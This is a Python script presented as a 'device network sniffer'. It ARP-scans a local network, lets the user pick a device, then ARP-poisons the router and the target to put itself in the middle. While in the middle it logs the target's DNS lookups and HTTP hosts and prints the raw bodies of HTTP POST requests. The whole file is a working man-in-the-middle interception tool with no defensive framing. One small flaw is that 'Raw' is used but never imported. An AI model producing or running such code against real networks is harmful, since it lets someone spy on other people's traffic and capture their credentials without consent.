#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style, init
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP
from scapy.layers.http import HTTPRequest
from mac_vendor_lookup import MacLookup, VendorNotFoundError

init(autoreset=True)

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (eg "192.168.0.0/24")',
                    required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router ', required=True)
opts = parser.parse_args()

def arp_scan(network, iface):
    """
    Performs ARP ping across the local subnet. Once a device responds, its IP
    and MAC address will be recorded. MAC address lookup will also be performed
    against the pre-defined OUI in https://standards-oui.ieee.org/oui/oui.txt.
    Do note that not all device are recognized so expect device will be
    unrecognized.
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                     timeout=5, iface=iface)
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    return input('\nPick a device IP: ')

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture(self):
        sniff(iface=self.iface, prn=self.process_packet,
              filter=f'src host {self.targetip} and (udp port 53 or tcp port 80)')

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def http(self, pkt):
        if pkt.haslayer(HTTPRequest):
            http_layer = pkt[HTTPRequest]
            time = strftime("%m/%d/%Y %H:%M:%S", localtime())
            print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{http_layer.Host}{Style.RESET_ALL}]')
            if http_layer.Method == b"POST":
                if pkt.haslayer(Raw):
                    print(f'{Fore.GREEN}{pkt[Raw].load}{Style.RESET_ALL}')

    def process_packet(self, pkt):
        if pkt.haslayer(DNS):
            self.dns(pkt)
        elif pkt.haslayer(HTTPRequest):
            self.http(pkt)

    def sniff(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())

        t1.start()
        t2.start()

if __name__ == '__main__':
    targetip = arp_scan(opts.network, opts.iface)
    device = Device(opts.routerip, targetip, opts.iface)
    device.sniff()
